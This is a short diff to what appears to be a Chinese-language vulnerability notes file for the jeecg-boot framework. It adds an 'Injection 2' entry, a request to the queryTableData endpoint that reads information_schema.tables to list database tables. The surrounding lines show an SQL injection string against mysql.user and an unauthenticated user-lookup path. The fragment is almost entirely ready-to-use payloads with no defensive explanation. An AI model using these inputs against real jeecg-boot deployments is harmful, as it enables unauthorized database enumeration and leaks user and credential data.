@@ -160,6 +160,13 @@ mysql.user
 要有查看权限对于语句 select *, ' as "label",x.js as "value" from ' from mysql.user
 
 ```
+注入2
+```
+/jeecg-boot/api/sys/dict/queryTableData?pageSize=10000&table=information_schema.tables&text=table_name&code=TABLE_SCHEMA
+```
+
+
+^
 未授权泄露最近的请求路径
 ```
 /sys/user/querySysUser?username=admin 查询某个用手机号
